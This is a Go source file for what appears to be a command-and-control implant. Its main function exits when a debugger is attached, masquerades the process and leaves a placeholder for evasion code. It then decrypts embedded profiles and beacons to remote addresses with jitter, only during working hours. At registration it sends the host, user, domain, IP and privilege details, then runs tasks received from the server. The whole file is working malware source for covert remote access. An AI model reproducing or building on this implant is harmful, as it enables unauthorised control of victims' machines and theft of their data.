// ─── Entry point ───────────────────────────────────────────────────────────────

func main() {
	if len(encProfiles) == 0 {
		os.Exit(1)
	}

	agent = impl.New()

	if agent.IsDebugged() {
		os.Exit(0)
	}

	agent.Masquerade()
	agent.OnStart()

	// __EVASION_INIT__

	// Try each embedded profile in order until one succeeds.
	for _, blob := range encProfiles {
		if len(blob) < 32 {
			continue
		}
		key := blob[:32]
		encData := blob[32:]

		plaintext, err := crypto.DecryptData(encData, key)
		if err != nil {
			continue
		}

		// Parse the profile from the decrypted binary blob.
		profile, err := protocol.ParseProfile(plaintext)
		if err != nil {
			continue
		}

		crypto.SKey = key
		initProfileState(profile)
		run(profile)
	}
}

// ─── Connection loop ───────────────────────────────────────────────────────────

func run(profile *protocol.Profile) {
	connCount := 0
	maxConn := profile.ConnCount

	for {
		if shouldExit() {
			os.Exit(0)
		}

		waitForWorkingHours()

		addr := profile.Addresses[connCount%len(profile.Addresses)]
		connCount++

		conn, err := agent.Dial(addr, profile)
		if err != nil {
			sleepWithJitter()
			if maxConn > 0 && connCount >= maxConn {
				os.Exit(0)
			}
			continue
		}

		connCount = 0

		// Build the init beat and send it encrypted.
		beat := buildBeat(profile)

		// InitPack: [BE uint32 agentType][BE uint32 agentId][raw beat]
		hdr := make([]byte, 8)
		binary.BigEndian.PutUint32(hdr[0:4], profile.Type)
		binary.BigEndian.PutUint32(hdr[4:8], rand.Uint32())
		initData := append(hdr, beat...)

		encrypted, err := crypto.EncryptData(initData, crypto.SKey)
		if err != nil {
			conn.Close()
			sleepWithJitter()
			continue
		}

		if err = protocol.SendMsg(conn, encrypted); err != nil {
			conn.Close()
			sleepWithJitter()
			continue
		}

		taskLoop(conn)
		conn.Close()
		sleepWithJitter()
	}
}

func taskLoop(conn net.Conn) {
	for {
		if shouldExit() {
			return
		}
		waitForWorkingHours()

		responses := mergeBinaryResponseBlobs(nil)
		if responses != nil {
			enc, err := crypto.EncryptData(responses, crypto.SKey)
			if err != nil {
				return
			}
			if err = protocol.SendMsg(conn, enc); err != nil {
				return
			}
		} else {
			if err := protocol.SendMsg(conn, nil); err != nil {
				return
			}
		}

		data, err := protocol.RecvMsg(conn)
		if err != nil {
			return
		}
		if data == nil {
			sleepWithJitter()
			continue
		}

		plaintext, err := crypto.DecryptData(data, crypto.SKey)
		if err != nil {
			return
		}

		responses = mergeBinaryResponseBlobs(TaskProcess(plaintext))
		if responses == nil {
			sleepWithJitter()
			continue
		}

		// Optional: compress large responses.
		// responses, _ = protocol.CompressZlib(responses)

		enc, err := crypto.EncryptData(responses, crypto.SKey)
		if err != nil {
			return
		}

		if err = protocol.SendMsg(conn, enc); err != nil {
			return
		}

		sleepWithJitter()
	}
}

// ─── Beat (registration) ──────────────────────────────────────────────────────
// The beat format must match the server's CreateAgent Packer expectations.

func buildBeat(p *protocol.Profile) []byte {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	internalIP := localIPv4()

	w := protocol.NewWriterBE()

	// Fields in the exact order the server's CreateAgent parses them:
	w.WriteUint32(uint32(p.Sleep))                    // Sleep
	w.WriteUint32(uint32(p.Jitter))                   // Jitter
	w.WriteUint32(uint32(p.KillDate))                 // KillDate
	w.WriteUint32(uint32(encodeWorkingTime(p.WorkStart, p.WorkEnd))) // WorkingTime
	w.WriteUint16(0)                                  // ACP
	w.WriteUint16(0)                                  // OemCP
	w.WriteUint8(0)                                   // GmtOffset
	w.WriteUint16(uint16(os.Getpid()))                // Pid
	w.WriteUint16(0)                                  // Tid
	buildNumber, majorVersion, minorVersion := osVersionFields()
	w.WriteUint32(buildNumber)
	w.WriteUint8(majorVersion)
	w.WriteUint8(minorVersion)
	w.WriteUint32(protocol.IPv4ToUint32(internalIP))  // InternalIp

	// Flags: bit 0=arch64, 1=sysArch64, 2=elevated, 3=isServer
	flags := byte(0)
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		flags |= 0x01 | 0x02
	}
	if agent.IsElevated() {
		flags |= 0x04
	}
	w.WriteUint8(flags)

	w.WriteBytes(crypto.SKey)                  // SessionKey
	w.WriteBytes([]byte(os.Getenv("USERDOMAIN"))) // Domain
	w.WriteBytes([]byte(hostname))             // Computer
	w.WriteBytes([]byte(username))             // Username
	w.WriteBytes([]byte(processName()))        // Process

	return w.Bytes()
}

func encodeWorkingTime(start, end int) int {
	if start == 0 && end == 0 {
		return 0
	}
	startHour := start / 100
	startMin := start % 100
	endHour := end / 100
	endMin := end % 100
	return (startHour << 24) | (startMin << 16) | (endHour << 8) | endMin
}

func osVersionFields() (uint32, uint8, uint8) {
	if runtime.GOOS != "windows" {
		return 0, 0, 0
	}
	out, err := exec.Command("cmd", "/C", "ver").Output()
	if err != nil {
		return 0, 10, 0
	}
	re := regexp.MustCompile(`(\d+)\.(\d+)\.(\d+)`)
	m := re.FindStringSubmatch(string(out))
	if len(m) != 4 {
		return 0, 10, 0
	}
	maj, _ := strconv.Atoi(m[1])
	min, _ := strconv.Atoi(m[2])
	bld, _ := strconv.Atoi(m[3])
	return uint32(bld), uint8(maj), uint8(min)
}

func loadOsReleasePrettyName() string {
	f, err := os.Open("/etc/os-release")
	if err != nil {
		return ""
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			return strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
		}
	}
	return ""
}

